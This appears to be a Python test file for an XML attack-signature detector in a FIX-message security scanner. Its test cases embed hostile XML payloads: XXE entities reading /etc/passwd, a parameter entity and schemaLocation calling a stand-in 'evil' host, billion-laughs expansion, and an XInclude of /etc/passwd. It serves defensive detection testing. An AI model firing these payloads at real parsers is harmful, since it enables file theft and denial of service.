"""Tests for the ENC (XML attack-signature) detector."""

from __future__ import annotations

from safix.config import Config
from safix.engine.runner import scan_bytes
from safix.parsing.encode import encode


def _msg_with_text(xml: str, tag: int = 58) -> bytes:
    # carry the XML in a (non-DATA) field whose value has no SOH
    return encode([(35, "B"), (34, 2), (49, "C"), (52, "20231015-10:00:00"), (56, "S"),
                   (148, "hl"), (tag, xml)], begin_string="FIX.4.4")


def _rules(xml: str, config: Config | None = None) -> set[str]:
    res = scan_bytes(_msg_with_text(xml), config=config, source="t.log")
    return {f.rule_id for f in res.active_findings}


def test_xxe_external_entity():
    xml = '<!DOCTYPE x [<!ENTITY e SYSTEM "file:///etc/passwd">]><x>&e;</x>'
    assert "SAFIX-ENC-001" in _rules(xml)


def test_parameter_entity():
    xml = '<!DOCTYPE x [<!ENTITY % p SYSTEM "http://evil/x.dtd">%p;]>'
    rules = _rules(xml)
    assert "SAFIX-ENC-002" in rules


def test_billion_laughs():
    cfg = Config.default()
    cfg.thresholds.xml_entity_ref_threshold = 5
    xml = '<!DOCTYPE l [<!ENTITY a "aaa">]><l>' + "&a;" * 8 + "</l>"
    assert "SAFIX-ENC-003" in _rules(xml, cfg)


def test_xinclude():
    xml = '<root xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include href="/etc/passwd"/></root>'
    assert "SAFIX-ENC-004" in _rules(xml)


def test_schemalocation_external():
    xml = '<a xsi:schemaLocation="http://evil/x.xsd">x</a>'
    assert "SAFIX-ENC-005" in _rules(xml)


def test_cdata_control_bytes():
    xml = "<a><![CDATA[x\x00y]]></a>"
    assert "SAFIX-ENC-006" in _rules(xml)


def test_clean_fpml_like_xml_no_finding():
    xml = "<FIXML><Order Sym='AAPL' Side='1' Qty='100'/></FIXML>"
    rules = _rules(xml)
    assert not any(r.startswith("SAFIX-ENC-") for r in rules)
